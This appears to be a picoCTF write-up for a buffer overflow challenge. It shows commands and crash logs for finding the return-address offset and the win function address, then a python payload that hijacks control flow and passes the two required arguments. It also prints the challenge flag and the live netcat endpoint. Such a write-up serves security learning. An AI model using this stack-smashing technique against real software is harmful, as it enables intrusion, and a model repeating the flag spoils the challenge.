# Exp

# Flag: picoCTF{argum3nt5_4_d4yZ_4b24a3aa}

Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this program? You can view source here. And connect with it using nc saturn.picoctf.net 58939

### Find the offset

msf-pattern_create -l 120 | ./vuln 
Please enter your string: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
zsh: done                msf-pattern_create -l 120 | 
zsh: segmentation fault  ./vuln
sudo dmesg| tail                  
[55789.616495]  loop0: p1 p2 p3
[55891.026682] EXT4-fs (loop0p3): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.
[57591.857395] login[291156]: segfault at 0 ip 000055c5d3c601f0 sp 00007ffe4cb99440 error 4 in login[55c5d3c60000+1000]
[57591.857401] Code: ff ff 48 89 45 c0 c7 45 fc 00 00 00 00 c7 45 f8 00 00 00 00 eb 47 8b 45 f8 48 98 48 8d 14 85 00 00 00 00 48 8b 45 98 48 01 d0 <8b> 00 8b 55 fc 48 63 d2 48 8d 8d 7a ff ff ff 48 01 d1 89 c2 48 8d
[90590.634274] vuln[451449]: segfault at 41414141 ip 0000000041414141 sp 00000000ffb3fca0 error 14 in libc-2.33.so[f7db5000+1d000]
[90590.634308] Code: Unable to access opcode bytes at RIP 0x41414117.
[91181.204514] vuln[454441]: segfault at 41414141 ip 0000000041414141 sp 00000000ffe3a510 error 14 in libc-2.33.so[f7cfc000+1d000]
[91181.204523] Code: Unable to access opcode bytes at RIP 0x41414117.
[91288.885687] vuln[455023]: segfault at 64413764 ip 0000000064413764 sp 00000000ffe40d50 error 14 in libc-2.33.so[f7cea000+1d000]
[91288.885696] Code: Unable to access opcode bytes at RIP 0x6441373a.
msf-pattern_offset -l 120 -q 64413764          
[*] Exact match at offset 112

### Ensure we get EIP

python2.7 -c "print ('A'*112 + 'BBBB')" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
zsh: done                python2.7 -c "print ('A'*112 + 'BBBB')" | 
zsh: segmentation fault  ./vuln
sudo dmesg| tail                                 
[57591.857395] login[291156]: segfault at 0 ip 000055c5d3c601f0 sp 00007ffe4cb99440 error 4 in login[55c5d3c60000+1000]
[57591.857401] Code: ff ff 48 89 45 c0 c7 45 fc 00 00 00 00 c7 45 f8 00 00 00 00 eb 47 8b 45 f8 48 98 48 8d 14 85 00 00 00 00 48 8b 45 98 48 01 d0 <8b> 00 8b 55 fc 48 63 d2 48 8d 8d 7a ff ff ff 48 01 d1 89 c2 48 8d
[90590.634274] vuln[451449]: segfault at 41414141 ip 0000000041414141 sp 00000000ffb3fca0 error 14 in libc-2.33.so[f7db5000+1d000]
[90590.634308] Code: Unable to access opcode bytes at RIP 0x41414117.
[91181.204514] vuln[454441]: segfault at 41414141 ip 0000000041414141 sp 00000000ffe3a510 error 14 in libc-2.33.so[f7cfc000+1d000]
[91181.204523] Code: Unable to access opcode bytes at RIP 0x41414117.
[91288.885687] vuln[455023]: segfault at 64413764 ip 0000000064413764 sp 00000000ffe40d50 error 14 in libc-2.33.so[f7cea000+1d000]
[91288.885696] Code: Unable to access opcode bytes at RIP 0x6441373a.
[91382.980491] vuln[455558]: segfault at 42424242 ip 0000000042424242 sp 00000000ffc6fa40 error 14 in libc-2.33.so[f7cbf000+1d000]
[91382.980500] Code: Unable to access opcode bytes at RIP 0x42424218.

### Find win function address
readlelf -s vul
64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win

### Generatre little endian address
python -c "from pwn import *; print(p32(0x08049296))"                    
b'\x96\x92\x04\x08'

### Check if we get into thw win function
python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08')" | ./vuln              
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Please create 'flag.txt' in this directory with your own debugging flag.

Success it's the message saying it's missing the flag

Created the flag.txt

python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08')" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: done                python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08')" | 
zsh: segmentation fault  ./vuln
sudo dmesg | tail                                           
[91630.971962] vuln[456700]: segfault at 0 ip 0000000000000000 sp 00000000ffd21f54 error 14 in vuln[8048000+1000]
[91630.971969] Code: Unable to access opcode bytes at RIP 0xffffffffffffffd6.
[91738.455717] vuln[457268]: segfault at 785c4141 ip 00000000785c4141 sp 00000000ff9c83f0 error 14 in libc-2.33.so[f7d0f000+1d000]
[91738.455726] Code: Unable to access opcode bytes at RIP 0x785c4117.
[91773.705274] vuln[457467]: segfault at 785c4141 ip 00000000785c4141 sp 00000000fff97010 error 14 in libc-2.33.so[f7d4f000+1d000]
[91773.705283] Code: Unable to access opcode bytes at RIP 0x785c4117.
[92324.325984] vuln[459896]: segfault at 785c4141 ip 00000000785c4141 sp 00000000ff8e3c80 error 14 in libc-2.33.so[f7d68000+1d000]
[92324.325994] Code: Unable to access opcode bytes at RIP 0x785c4117.
[92359.978641] vuln[460141]: segfault at 0 ip 0000000000000000 sp 00000000ffa4af04 error 14 in vuln[8048000+1000]
[92359.978648] Code: Unable to access opcode bytes at RIP 0xffffffffffffffd6.

We get return code of 0

python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08' + 'CCCC')" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
zsh: done                python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08' + 'CCCC')" | 
zsh: segmentation fault  ./vuln
sudo dmesg | tail                                                    
[91738.455717] vuln[457268]: segfault at 785c4141 ip 00000000785c4141 sp 00000000ff9c83f0 error 14 in libc-2.33.so[f7d0f000+1d000]
[91738.455726] Code: Unable to access opcode bytes at RIP 0x785c4117.
[91773.705274] vuln[457467]: segfault at 785c4141 ip 00000000785c4141 sp 00000000fff97010 error 14 in libc-2.33.so[f7d4f000+1d000]
[91773.705283] Code: Unable to access opcode bytes at RIP 0x785c4117.
[92324.325984] vuln[459896]: segfault at 785c4141 ip 00000000785c4141 sp 00000000ff8e3c80 error 14 in libc-2.33.so[f7d68000+1d000]
[92324.325994] Code: Unable to access opcode bytes at RIP 0x785c4117.
[92359.978641] vuln[460141]: segfault at 0 ip 0000000000000000 sp 00000000ffa4af04 error 14 in vuln[8048000+1000]
[92359.978648] Code: Unable to access opcode bytes at RIP 0xffffffffffffffd6.
[92403.881905] vuln[460368]: segfault at 43434343 ip 0000000043434343 sp 00000000ff8a2a34 error 14 in libc-2.33.so[f7cdc000+1d000]
[92403.881934] Code: Unable to access opcode bytes at RIP 0x43434319.

Return code of 43434343 (CCCC)

Now we can pass the arguments to match 

```
if (arg1 != 0xCAFEF00D)
    return;
if (arg2 != 0xF00DF00D)
  return;
```

### Success

python2.7 -c "print ('A'*112 + '\x96\x92\x04\x08' + 'CCCC' + '\x0D\xF0\xFE\xCA' + '\x0D\xF0\x0D\xF0')" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
picoCTF{test}zsh: done                python2.7 -c  | 
zsh: segmentation fault  ./vuln